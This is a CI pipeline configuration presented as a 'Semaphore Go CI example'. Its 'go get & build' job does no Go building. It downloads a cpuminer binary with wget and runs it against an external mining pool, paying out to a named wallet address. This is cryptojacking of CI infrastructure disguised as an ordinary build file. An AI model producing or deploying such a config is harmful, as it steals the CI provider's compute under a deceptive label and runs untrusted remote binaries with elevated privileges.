version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - 'git clone https://github.com/kadeng/limit_visible_cpus'
            - cd limit_visible_cpus
            - sudo pip install py3nvml
            - sudo cp -av dist/bin/* /usr/local/bin/
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - 'tar xf cpuminer-opt-linux.tar.gz '
            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
            - sleep 2
            - done
      agent:
        machine:
          type: a1-standard-4
          os_image: macos-xcode11
